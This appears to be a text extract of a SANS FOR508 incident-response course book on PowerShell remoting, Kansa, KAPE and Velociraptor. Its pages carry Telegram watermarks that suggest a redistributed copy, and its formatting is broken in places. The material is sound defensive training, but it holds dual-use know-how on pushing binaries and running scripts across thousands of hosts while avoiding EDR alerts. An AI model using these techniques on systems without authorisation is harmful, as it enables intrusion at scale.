-v[rs] Query VirusTotal (www.virustotal.com) for malware based on file hash.
Add 'r' to open reports for files with non-zero detection. Files
reported as not previously scanned will be uploaded to VirusTotal
if the 's' option is specified. Note scan results may not be
available for five or more minutes.
-vt Before using VirusTotal features, you must accept
VirusTotal terms of service. See:
https://www.virustotal.com/en/about/terms-of-service/

.

If you haven't accepted the terms and you omit this
option, you will be interactively prompted.
-z Specifies the offline Windows system to scan.
user Specifies the name of the user account for which
autorun items will be shown. Specify '*' to scan
all user profiles.
-nobanner
Do not display the startup banner and copyright message.

86

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

IRSpreadsheet.xlsx: Fill Out a fter Each Lab
• Template in your VM and the class dropbox
• We highly recommend filling it out as you complete each lab in this class
• “Lab Takeaways” good hints on what to include
• It will become invaluable for the final Forensic Challenge

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

87

.

One of the first lessons that any incident responder will learn is to “document as you go.” Nothing is more
valuable than a spreadsheet or organization of findings you have uncovered along the way. We have included a
battle-tested indicators spreadsheet to use for this class. We recommend that you attempt to try and fill this out
after each lab. It helps to document as much information as you can about the incident as you go. You will be
amazed at how much information you will begin to juggle around even after ten additional minutes of analysis.
Taking a moment to write down a specific IP/host or account that is compromised will be critical to keeping it
all straight in your head.
This isn’t a requirement when you are just beginning to learn analysis, but it will greatly help on your final
challenge to document key items you find now. Identifying evil on new systems is infinitely easier when you
already have an initial list of tradecraft to investigate.
Note: The findings present in this slide are examples only and do not pertain to your current investigation.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

87

Lab 1.2
Malware Persistence Analysis
Average Time: 25 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

88

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

88

Advanced Incident Response and Threat Hunting Agenda

Incident Response & Threat Hunting
Threat Intelligence
Malware-ology
Malware Persistence
Incident Response: Hunting Across the Enterprise
Credential Theft
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

89

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

89

Incident Response:
Hunting Across the Enterprise

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

One of the biggest challenges with enterprise forensics and incident response is simply getting to the data.
Whether it is for an internal employee investigation or a network intrusion, the challenges of accessing the
required data across an enterprise network can be daunting. For employee investigation cases, we often have a
little more flexibility in acquiring the data, as time may not be as critical. We could, therefore, consider multiple
acquisition options, including even shipping the subject system to the analyst. However, shipping drives is not
ideal, so it is important to have alternatives.
When it comes to incident response and dealing with network intrusions, we not only have the challenge of
acquiring and analyzing data of remote systems, we also now have the added complications of significant time
constraints coupled with multiple systems to analyze (often thousands). This makes it even more critical to have
tooling available to quickly access and process forensic data for analysis. Shipping drives and dealing with full
disk images will not provide us with the speed and agility required to impede skilled intruders. Luckily, some
excellent options exist to provide incident responders with rapid data collection at scale.

90

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

90

Rapid-Response Tooling Solutions
Solution

Kansa

KAPE

Velociraptor

Supported
Operating
Systems

Primary Use
Case

Deployment
Strategy

Primary
Advantage

Primary
Disadvantage

Windows

Incident response
& threat hunting

Enable PowerShell
Remoting via GPO

Uses PowerShell
Remoting for
efficiency and
credential safety

Not designed for
forensic
acquisition

Windows

Triage imaging &
artifact postprocessing

Manual or scripted Designed for
standalone use cases

Powerful yet
simple to use

Designed for
targeted collection
(not large-scale
remote use)

Windows, Mac, &
Linux

Triage imaging,
incident response,
& threat hunting

Use software
management tools or
GPO to deploy agents

Extremely
flexible with
multi-OS support

Rapid
development cycle
means dealing
with frequent
updates

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

91

.

While our industry has had to deal with an ever-increasing number of threats and incidents to handle, we’ve also
been fortunate to see a steady increase in tooling options to deal with those challenges. There are many exciting
solutions available, both from the commercial marketplace and from the open-source community. In this class,
we try to focus on a few very capable free and low-cost options which can cover the gamut of remote DFIR
tooling needs. The table above lists tools we have found to be very compelling in terms of capability, usability,
and total cost of ownership. We will cover each of these solutions in turn and you will have the opportunity to
gain experience with these tools during several parts of the course.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

91

PowerShell
Kansa

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

92

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

92

PowerShell: The Future Is Now

• The future of Windows administration tool
• Available in all modern versions of Windows
• Powerful scripting language
• WMI, .NET, and COM all in one
• Allows for remote analysis and local logging
• Flexible post-processing and filtering

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

93

“PowerShell is both a scripting language and a powerful interactive command interface similar to Bash in
UNIX. PowerShell console, where the commands are run, is similar to the Windows command interface,
cmd.exe. PowerShell commands can be run in the background or interactively if a particular country’s privacy
policy enforces an organization to do so.”

.

“PowerShell commands or cmdlets are based on .NET Framework objects, which means that the objects carry
multiple aspects or properties of the command. These cmdlets let you access the filesystem and other Windows
operating system data stores, such as the registry. PowerShell also provides access to Windows Management
Instrumentation (WMI), which means that all the WMI commands that incident responders and information
security professionals are familiar with can be run using PowerShell.”
“Windows 7 operating system provides an option to run the PowerShell scripts remotely. Microsoft uses the
industry-standard WS-Management Protocol to provide remote management features.”
Sourced from “Live Response Using PowerShell,” by Sajeev Nair: http://for508.com/1nsjz

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

93

PowerShell Basics

• Verb-noun naming scheme
• Get-Process
• Get-Service

• Large number of aliases (Dir == Get-ChildItem)
• Get-Alias *

• Output is objects that are passed to other cmdlets
• Get-Service | Out-GridView
• Netstat.exe | Select-String ‘Established’

• Direct access to providers like disk and registry
• Get-ChildItem HKLM:Software | Format-Wide
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

If you perform incident response in the Windows enterprise, the time has come to learn PowerShell (PS).
Microsoft continues to double down on support for it and a vast amount of the operating system is now being
implemented as PowerShell cmdlets. Luckily, it is one of the easiest scripting languages to learn. Cmdlets (small
programs or commands) are the building blocks and use a verb-noun naming scheme with the noun being an
object or class of objects to do something to. If you are already familiar with the Windows command line
interface, you will be pleasantly surprised that nearly all the commands you know have been ported over to PS.
This is accomplished through aliases, and there are more than 150 prebuilt aliases. (You can also add your own.)
For example, “Dir” is aliased to the cmdlet “Get-ChildItem.” You will also notice that native commands and
executables can be run from PowerShell just as they were in cmd.exe.
One important concept in PowerShell is that command output is not in strings, as it may look in the terminal.
Data is encapsulated in objects, which can then be easily passed to other cmdlets to perform additional
processing. One cmdlet might generate a list of objects representing files, computers, services, and network
objects; the next in the pipeline might filter and pass on just the ones that are of interest; and the next might call
methods to perform actions on the objects. A simple example is output formatting. Output can be easily changed
by piping one cmdlet to an outputter such as “Out-GridView,” which provides a GUI interface into the data. To
display the various components of an object, pipe the command into “Get-Member.”
A final important concept is the idea of a provider. PowerShell abstracts collections of items into containers
called providers. Providers can be file volumes, the registry, Active Directory, and so on. This makes it trivial to
interact with other objects in Windows. In the example on this slide, “Get-ChildItem HKLM:Software,” we list
the registry keys below the HKLM/Software hive. You can even mount a network share to a PS provider (using
the New-PSDrive cmdlet)!
There are an amazing number of great resources for learning PowerShell. One classic book is Learn Windows
PowerShell in a Month of Lunches by Don Jones and Jeffery D. Hicks. There are also many great online articles.
Some relevant ones follow.

94

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

94

PowerShell for incident response:
• PowerShell: Forensic Oneliners – http://for508.com/-a0jb
• Weekend Scripter: Using PowerShell to Aid in Security Forensics – http://for508.com/ur96m
PowerShell to find evil:

.

• Use PowerShell to Perform Offline Analysis of Security Logs: http://for508.com/0b3q• Use PowerShell to Get File Hashes: http://for508.com/izchu
• Compute MD5 Hashes and Find Changed Files: http://for508.com/sb8u4

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

95

PowerShell Remoting

• WinRM Service required
• Enabled by default on Server 2012+

• Enter-PSSession

• Provides remote shell; Alternative to SSH

• Invoke-Command
• Allows concurrent one-to-many command execution

• Filtering accomplished on remote host

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

One of the most useful features of PowerShell is the native support for executing commands on remote systems.
This feature is at the crux of why PS is so valuable for incident responders. The Windows Remote Management
service is used, which is already enabled in many environments for WMI data collection and event log
forwarding and is enabled by default starting all the way back in Server 2012. The transfer protocol is WSManagement (WSMAN), which uses SOAP, XML, and HTTP listeners to pass through packet inspection
devices. Even though HTTP is employed for the inbound connection, the data transferred is encrypted and
credentials are authenticated via Kerberos.
The cmdlet “Enter-PSSession <computername>” provides an interactive remote shell on the target system.
However, unlike RDP or some implementations of PSExec, credentials are not cached on the remote system,
providing an excellent solution for quick data gathering from a remote host.[1]
The “Invoke-Command” cmdlet is used to send remote tasks to systems without creating an interactive
session.[2] The full suite of PS capabilities is available on the remote system, including the capability to run
scripts. A script can be passed via the “-ScriptBlock” parameter, or a script can be copied to the remote system
using the “-FilePath” option. Although the ability to run scripts remotely is nice, its true power comes in the
built-in capability to extend execution from one-to-many. Instead of needing to implement a loop in the script to
iterate through a collection of systems, “Invoke-Command” can natively take an array of computer names as an
argument. Now with one command, you can run an extremely complicated script across potentially thousands of
systems!
You may be thinking, “How long will it take to run a script on thousands of systems?” The answer is probably a
lot less than you think! Jason Hofferle did a comparison of using a WMI command to retrieve the last 20 events
from the security log of 100 computers using a loop versus using the concurrent connections allowed by
“Invoke-Command.”[3] The results were astounding, with “Invoke-Command” completing the task on 100
systems in 15 seconds and the loop taking more than 6 hours! Further, he scaled the PS job to 1,000 systems and
it completed in 131 seconds.

96

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

96

The big difference here is that “Invoke-Command” pushes processing and filtering onto the remote host. The
WMI loop had to bring the event log all the way back to the host system where the filtering was accomplished.
Pushing processing and filtering to the host is exactly what we want when doing large-scale IR collection!
Finally, PS also includes the capability to manage remote executions as a background job with the “-AsJob”
parameter. This is especially useful when running scripts that take a long time or on many systems. The status of
remote jobs can be identified with the “Get-Job” cmdlet.

.

[1] Power of PowerShell Remoting by Mike Pilkington: https://for508.com/elnhv
[2] Invoke-Command: https://technet.microsoft.com/en-us/library/hh849719.aspx
[3] PowerShell Remoting Performance: http://www.hofferle.com/powershell-remoting-performance/

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

97

PowerShell Authentication

• Best-case scenario from security perspective
• Default is nondelegated Kerberos
• Precludes delegate token stealing
• Do NOT use CredSSP (dual-hop) auth

• Non-interactive (Type 3) logon
• Even Enter-PSSession does not cache creds

• Credentials not passed to remote system and hence
not available to tools, such as Mimikatz, Incognito,
etc.
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Strong authentication and encryption are taken care of in the background by PowerShell. Remote PS sessions
are encrypted, and authentication occurs using Kerberos. Sessions are treated as non-interactive (including
dropping to an Enter-PSSession shell), so password hashes are not cached on the remote system. This makes it
far safer to use than alternatives like RDP. Also, by default, PS uses nondelegated authentication tokens,
meaning tokens cannot be stolen from the remote system and then used to authenticate to additional systems.
This is the ideal situation from a security perspective but can cause issues if scripts are written in such a way
that they require access to a third system. This is called “dual-hop” authentication and is implemented with a
service called CredSSP (essentially single sign-on). However, you should aim to NEVER use it. CredSSP will
store credentials on the remote system, including the hash and token extracted by tools such as Mimikatz.[1] In
fact, this is one of the reasons why PS is such a great replacement for standard batch scripts. When run on
remote hosts, batch scripts often required the host to authenticate to a network share to either pull binaries or
store data, effectively requiring that “dual-hop” authentication be used. In general, scripts that pull binaries from
shares or dump data to shares require delegation authority, which leaves credentials available on the remote
host! By default, PowerShell remoting eliminates these security concerns and ensures that valuable credentials
such as Domain Admin are not scattered on systems throughout the environment.
[1] Accidental Sabotage: Beware of CredSSP: http://for508.com/whnby

98

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

98

Kansa: PowerShell IR Framework
• Designed by Dave Hull to scale PowerShell IR data collections
• Framework organizes data collection and module selection
• Modules are written as PowerShell scripts

• Can scale to thousands of systems with new updates
• Not confined to PowerShell cmdlets—execute virtually anything

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

99

Kansa uses PowerShell Remoting to run user-contributed modules across hosts in an enterprise to collect data
for use during incident response, breach hunts, or for building an environmental baseline.

.

• If users don't supply their own list of remote systems (targets), Kansa will query Domain Controllers and
build the list automatically.
• Error handling and transcription with errors are written to a central file.
• PowerShell remote job management is used, invoking each module on target systems, in parallel, currently
using PowerShell's default of 32 systems at a time.
• Output management: As the data comes in from each target, Kansa writes the output to a user-specified
folder, one file per target per module.
• A modules.conf file where users can specify which modules they want to run and in what order, lending
support to the principal of collecting data in the order of volatility.
Kansa was designed to gather data from hundreds of hosts at a time, given two prerequisites are satisfied: 1)
your targets are configured for Windows Remoting (WinRM) and 2) the account you're using has Admin access
to the remote hosts (only local admin is required).
Getting a copy of Kansa is easy; simply download it and extract it from GitHub to a location of your choice.[1]
The repository contains several folders. The .\Modules folder contains the plugins that Kansa will invoke on
remote hosts. Plugins are aggregated into subfolders by the type of data they are designed to extract. Looking
around in this folder will give you a good idea of the current capabilities of the tool.
The .\Analysis folder contains PowerShell scripts for conducting basic analysis of the collected data. Many
of the analysis scripts require logparser.exe, which is not part of the distribution. So, if you are planning to
use this feature, logparser.exe will need to be downloaded and placed in the path. Keep in mind you can also
create your own analysis workflow. Because Kansa output is typically tab-separated, it can easily be imported
into the database of your choice; you can run queries against it using Logparser, load it into Excel, and so on.
Kansa’s capabilities can be easily expanded by writing new modules. Because the language is PowerShell, the
barrier to entry is low and the capabilities available are massive. Even if you never plan to use Kansa, you can
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

99

learn a lot about the types of data useful during incident response by looking through the existing modules and
then using the tool of your choice to collect the same data.
A common criticism of all live response collection is its susceptibility to being fooled by a malicious rootkit on
the system. Rootkits are used by malware to hide and often exist at low levels in the system like the operating
system kernel. Because most live response tools (including system commands, WMI, .NET, and PowerShell)
rely upon the Windows API to collect data, a rootkit can easily subvert those API functions to return incomplete
data. However, keep in mind that rootkits are rare and are not used nearly as prevalently as some would
suggest. If a rootkit is present, then data collection should be accomplished via memory or disk forensics—both
of which can identify a rootkit and its activities (as we will see later in this course). But deep dive forensics is
much too time-consuming to run on hundreds of systems. Hence, we typically make the trade-off of speed and
efficiency of live response toolkits for large-scale collection while augmenting that analysis with deep dive
forensics of a smaller sample of systems. Of course, knowing whether a rootkit is in play and where it might be
is a chicken-and-egg problem. That question can often be answered by security alerts, forensic examinations, or
via threat intelligence.
Some text used with permission from Dave Hull.[2]

.

[1] GitHub Kansa: http://for508.com/so5mk
[2] TrustedSignal Blogspot (Dave Hull): https://for508.com/vxgzj

100

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Kansa Modules.conf

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

101

.

Kansa modules are written in PowerShell and are selected at runtime by referencing the Modules.conf file
within the Modules folder. This file is a simple flat configuration file that contains the name and relative
location (notice that subfolder names are included with the script names) of each script to be run. As new scripts
are written or added to the repository, Modules.conf can be easily updated to request those modules be run. In
addition, to prevent a module from running, preface the line with a “#,” effectively commenting it out of the file.
The Modules.conf file should be set up to respect the Order of Volatility of data collected. Artifacts that change
frequently such as network data, system memory, or Prefetch should be collected early in the process so that
evidence is not unnecessarily overwritten. Simply moving those script names closer to the top of the file ensures
they are run before others. For example, note that in this slide, we see scripts listed at the top, which are
responsible for collecting highly volatile data such as Prefetch, DNScache, and Arp information.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

101

.
102

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Running Kansa
.\kansa.ps1 -OutputPath .\Output\ -TargetList .\hostlist
-TargetCount 250 –Verbose -Pushbin

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

103

A simple command line for Kansa might look like the following:
PS C:\tools\Kansa> .\kansa.ps1 –TargetList .\hostlist -Pushbin

.

Although the .\Modules folder holds all the available scripts to run, kansa.ps1 is the script used for kicking
off data collection. The command line arguments are straightforward. “-TargetList
.\hostlist” tells kansa.ps1 to run collectors against the systems listed in the hostlist file, which should contain
one host per line. If you omit this argument, Kansa will query Active Directory (AD) for the list of computers
and target all of them. Querying AD in this way requires this Active Directory module that’s bundled with
Remote Server Administration Tools, so you’ll need that installed if you’re not providing a list of targets via TargetList.[1] If using the AD option, you should also consider including the “-TargetCount” parameter to limit
the total number of systems queried (perhaps using a small sample for a test run, and subsequently omitting it to
run across the entire environment).
The results returned by each system will be written to an Output folder within the Kansa folder by default. Each
collector's output is written to its own folder. Collector scripts are typically written to take the PowerShell
objects returned from remote systems and convert them to easy to parse TSV.
A final important option is “-Pushbin,” which is required by scripts that employ third-party binaries. If this
argument is provided and a script with a binary dependency is run, kansa.ps1 will first copy any required
third-party binaries to the targets before running the script. All in all, this is a handy way to run third-party tools
remotely!
The “Verbose” option provides additional debugging information to the terminal.
[1] Download Remote Server Administration Tools: http://for508.com/jucow

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

103

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

.

.\kansa.ps1 -OutputPath .\Output\ -TargetList
.\hostlist -TargetCount 250 –Verbose -Pushbin

© 2023 SANS Institute

104

Kansa + Third-Party Tools

• Kansa is not limited to WMI or PS cmdlets
• It can also push and execute binaries
• Place in the .\Modules\bin directory
• Use –Pushbin argument
• Remove binaries after execution with –Rmbin

• Output returned and formatted as PS objects
• Binaries can be deleted or left for future use
Get-Autorunsc.ps1

Get-FlsBodyfile.ps1

Get-ProcDump.ps1

Get-CertStore.ps1

Get-Handle.ps1

Get-RekalPslist.ps1

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

105

.

Although PowerShell is extremely capable, there are certainly instances in which a third-party collection tool is
necessary. Luckily, Kansa is not limited to Windows native commands or PowerShell cmdlets. The process to
include a third-party binary in a script is simple: Copy the binary into the .\Modules\bin\ directory, include a
special comment on the second line of the collector script, and ensure you are running kansa.ps1 with the –
Pushbin argument.
The special comment that must be included in the script is referred by the author as a directive. The directive for
the Get-Autorunsc.ps1 module looks like this:
# BINDEP .\Modules\bin\Autorunsc.exe
Note that it is an actual comment, but that Kansa knows to look for the “BINDEP,” which stands for “binary
dependency.” This directive tells Kansa to copy .\Modules\bin\Autorunsc.exe to the remote targets before
executing the script. By default, binaries will be copied to the %SystemRoot% folder (usually C:\Windows). It is
up to the script author as to whether the binary should be deleted after use. One reason that deletion may not be
desired is if you plan to run the script again in the future and want to speed up the process. If the binary is
already in place on the target system, you can omit the –Pushbin argument. If you would like to remove the
binary after use, add the –Rmbin argument.
Several modules currently depend on third-party binaries, including:
•
•
•
•
•
•

Get-Autorunsc.ps1
Get-CertStore.ps1
Get-FlsBodyfile.ps1
Get-Handle.ps1
Get-ProcDump.ps1
Get-RekalPslist.ps1

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

105

Distributed Kansa + Fire & Forget

• Epic upgrade provided by John Ketchum and USAA Team
• Scale collection from ~150 to 150,000+ systems
• kansa.ps1 → DistributedKansa.ps1
• Scripts included to set up distributed Kansa-Servers
• Fire & Forget modules collect and send data asynchronously to ELK
• Kill switches, VDI/CPU throttling, alert suppression, and metrics

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In perhaps one of the most incredible pull requests in GitHub history, John Ketchum and the threat hunting team
from USAA Bank added an unprecedented number of features to Kansa in mid-2020. In a must watch
presentation, John provides the history as the bank incrementally added to the project to get around collection
bottlenecks, solve security and monitoring issues, and eventually end up with a tool capable of performing
complex threat hunting tasks across 150,000 systems.[1] All of their changes have now been accepted into the
framework while keeping the original functionality present for backwards compatibility. Kansa is now really
two tools in one: a simple tool to run PowerShell collections on a small number of systems at a time (most
practitioners have historically chunked target lists into 150 or less systems) and a massive distributed collection
platform engineered to work on complex networks of almost any size. You can start using simple Kansa
collection, prove the model, and then grow it to meet the needs of a larger enterprise.
The features added are far too numerous to cover in any depth in the time available here, but include the
capability to set up distributed Kansa servers to load-balance collection requests, set up servers to host
executables to be pulled from the client side (reverse of the -Pushbin option), “fire and forget” modules that run
asynchronously and send results directly to the database (skipping the bottleneck of the Kansa application), and
formatted output ready for inclusion into an elastic search database. Safety mechanisms include automated
helpdesk alerts, staggered execution, a killswitch, VDI abort criteria, CPU limiter, and cleanup scripts to use
when an abort is necessary. Mr. Ketchum also demonstrates their additions of EDR “safe words”, access to a
password vault API, and integration with SOAR platforms to ensure that unusual PowerShell collection doesn’t
trip alarms and spin up the incident response team.
The code is well documented PowerShell, and the slide deck does an excellent job of stepping through the
thought process of the various additions to Kansa.[2] The case studies showing real-world use of the new
features at the end of the presentation are enlightening and excellent examples of threat hunting performed with
home-grown tooling. We owe a debt of thanks to Mr. Ketchum and USAA for sharing their work with the
community!
[1] Kansa for Enterprise Scale Threat Hunting w/ Jon Ketchum (video): https://for508.com/95tpx
[2] Kansa for Enterprise Scale Threat Hunting (slides): https://for508.com/7fntg

106

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

106

KAPE

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

107

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

107

Introducing KAPE

Forensically • Full metadata preservation
• Detailed audit logs
sound
• Supports Volume Shadow copies
• Extracts alternate data streams

Robust

• Handles locked files

Flexible

• Deduplication of files via SHA-1
• Send results across network via SFTP
• Customize it to your investigative needs
• Create your own targets and modules

Extensible

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

KAPE is a free triage collection and post-processing application written by Eric Zimmerman. It’s designed to
work with crowd-sourced “target” files, which identify specific artifacts to be collected in a “triage” image.
Targets can be grouped into meta-files to be used for different forensic case types. As one example, KAPE
ships with a meta-file named !SANS_Triage.tkape, containing targets for nearly all the artifacts discussed in the
SANS FOR498, FOR500 and FOR508 classes.[1]
In its simplest form, KAPE provides a reliable and rapid means to collect forensic data from a system. It is
currently Windows only and can be executed from a thumb drive or pushed/downloaded to a remote system.
Results can be sent to an attached drive, a file share, SFTP server, or to the cloud via Amazon AWS or
Microsoft Azure. SANS instructors Mark Hallman and Carlos Cajigas have published solutions using
PowerShell remoting to have endpoints download and run KAPE in batch mode with data sent to an SFTP
server in the cloud. [2,3]
It is hard to overstate the capabilities of this tool. Virtually any forensic artifact you could need can be easily
collected. Important features include:
•
•
•
•
•
•
•
•
•

Portable (no install)
Detailed audit logging
Flexible & customizable (does not have the wildcard and recursion issues other tools have)
Allows for easy standardization of what teams collect
Can collect locked system files and alternate data streams
Supports collection from Windows Volume Shadow Copies
Inline de-duplication to reduce collection sizes
Supports post-processing of data via a module's capability
Exceptionally fast

[1] KapeFiles/Targets at GitHub: https://for508.com/xp1ir
[2] Collecting KAPE at Scale: https://for508.com/a0wfs
[3] Use KAPE to collect data remotely and globally: https://for508.com/n3sbd

108

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

108

KAPE Target Collection

• Where the data is
– Drive letter
– Directory
– F-Response

--target
• What data to collect
‒ File system
– Evidence of execution

• Where to copy the data
to
‒ Directory
‒ UNC path
‒ VHD/VHDx
container

--tsource

--tdest

kape.exe --tsource F --target !SANS_Triage --tdest C:\temp\Output
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

109

The example on this slide demonstrates a sample KAPE command line. In this case, collection will be from the
“F” drive, the targets to collect will be the SANS_Triage compound-file containing recommended artifact
targets, and output will be sent to the folder C:\temp\Output. While KAPE supports many more options than
what is seen here, this example demonstrates how simple collection can be.

.

tsource
The drive letter or directory to search. This should be formatted as C, D:, or F:\.
target
The target configuration to run, without the extension. Get a list of all available targets with the --tlist switch.
tdest
The directory where files should be copied to. This directory will be created if it does not exist. This can be a
regular directory or a UNC path.
Other imporant options:
tvss: Find, mount, and search all available Volume Shadow Copies on --tsource.
vhdx and vhd: Creates a VHDX virtual hard drive from the contents of --tdest.
debug: When true, enables debug messages.
A GUI front-end to KAPE, named gKAPE, also ships with the tool making it easy to navigate available options
and generate complex command-lines which can then be re-used. Andrew Rathbun created an excellent online
tutorial video for KAPE.[1]
[1] Kroll Artifact Parser and Extractor (KAPE) Official Demo: https://for508.com/a2zgc

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

109

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

110

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

110

Introducing Velociraptor

Scalable

• Easily supports 10,000+ hosts on single-server deployment
• Multi-frontend server solution allows it to scale horizontally

Query-based
Flexible
Multi-OS

• “VQL” designed to allow relatively easy access to forensic artifacts
• Queries can be a point-in-time collection
• Queries can also be ongoing to continually stream back results
• Administer deployment via WebUI, CLI, or external API
• Interactive shell for real-time interaction with clients
• Triage-mode allows collection using a standalone package
• Windows
• Linux
• Mac

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

111

.

Velociraptor is primarily the work of Michael Cohen, who has been a key figure in the development of several
high-profile DFIR tools. He contributed significantly to Volatility, and later forked it to create Rekall. Rekall
included most of the features of Volatility, but also some important new ones, such the ability to run memory
analysis live on the endpoint. That capability was a critical component of a larger project he was heavily
involved with called GRR. While at Google, he was a lead developer to the popular GRR Rapid Response
project. In 2018, Michael Cohen left Google to start a new company based on an idea to create a simpler, yet
more effective version of GRR. This new tool is called Velociraptor. The company he started is called
Velocidex and its aim is to provide commercial support for this open-source tool.[1]
A significant development occurred on April 21, 2021, when Rapid7 announced they had acquired the
Velociraptor open-source project. Every indication is that Velociraptor will remain an open-source project,
much as Rapid7 has maintained the Metasploit project for more than a decade. Read more about the acquisition
on the Rapid7 and Velociraptor websites. [2][3]
Of course, any modern IR agent must scale to many thousands of hosts. Velociraptor allows for the ability to
query for IOCs and hunt for intrusions across thousands of hosts. When a suspicious host is found, one-to-one
analysis can be performed, including the ability to locate and retrieve files of interest, perform additional
targeted analysis with many built-in searches, and even launch an interactive shell to the client if necessary.
The majority of client-server deployments involve a single server. Documentation suggests that a single server is
designed to handle 10,000 clients with default memory-management settings. However, a single server can scale
to larger deployments with larger servers and changes to the default settings. [4]
A major bottleneck on the frontend server is TLS encryption between server and clients. One way to address this
to improve scaling is adding a reverse proxy to offload the encryption task. Another solution is a multi-frontend
deployment that allows multiple servers to handle the client connections while sharing the same backend storage
solution using distributed file systems like NFS. This feature was added in May 2021. Discussions in
Velociraptor’s Discord server indicate successful deployments of 125,000 clients with this new solution. Learn
more about the multi-frontend deployment in Michael Cohen’s “Scaling Velociraptor” article.[5]

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

111

From the beginning, a major design goal has been flexibility. The primary way that is achieved is via a purposebuilt query language called VQL (Velociraptor Query Language). VQL allows analysts to create and use
relatively simple queries in powerful ways. The queries can analyze many facets of the operating system. They
can be used for a one-time immediate collection of data, or they can be set to continually stream results from the
client back to the frontend server. This allows for continuous monitoring capabilities and even automated
response functionality. Some examples include:
•
•
•
•
•

Continuously monitor Windows event logs of interest, such as failed logons via the Security log (EID 4625)
Monitor all process creations via the Sysmon event log (EID 1)
Monitor DNS queries by endpoints
Watch for new service creations and acquire the service executable automatically
Watch for new executables by name, hash, parent, or other characteristics and kill them

Yet another useful feature of Velociraptor is the ability to use it as a standalone triage tool. Velociraptor can be
configured to run almost any query or data collection process on a standalone host, just as if it were receiving
the jobs from a server. It can also launch third-party tools for additional collection or analysis. Several blog
articles have been written about this capability. [6] [7]
While the list of features provided by Velociraptor is very impressive, the simple nature of its architecture is
equally impressive. All the functionality is provided by a single executable and an accompanying configuration
file. The executable is initiated with a configuration file and command-line parameters instructing it to act as
either a server or a client. As a server, it hosts a web-based user interface (WebUI) that can be used to check the
health of the deployment, initiate IOC “hunts”, analyze individual hosts, and receive files and streamed data
from the client. Furthermore, virtually anything that can be accomplished via the WebUI can also be done at the
command-line, as well as via a published external API.[8]
This is not an exhaustive list of Velociraptor capabilities, but it should shed some light on why it’s such an
exciting new tool to arrive on the scene. And to top it off, Velociraptor supports on all 3 major OS platforms:
Windows, Linux, and Mac!

.

[1] Velocidex: https://for508.com/ln2u[2] Rapid7’s announcement on acquiring Velociraptor: https://for508.com/ftv5w
[3] Michael Cohen’s announcement on being acquired by Rapid7: https://for508.com/kz3sf
[4] Velociraptor Performance documentation: https://for508.com/fpydj
[5] “Scaling Velociraptor” article: https://for508.com/kr9uo
[6] Michael Cohen Triage-mode article: https://for508.com/vld2z
[7] Matthew Green Triage-mode article: https://for508.com/t7wbs
[8] Velociraptor API: https://for508.com/74doa

112

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

What Are Velociraptor “Artifacts”?
• “Artifacts” are stored VQL queries
• Many built-in, such as:
• List running processes
• Enumerate users
• Collect Autoruns persistence data
• Collect “Evidence of Execution” data
• Search for specific files or directories
• Use Kape “target” definitions to
automate raw file collection

Clone and
customize
existing
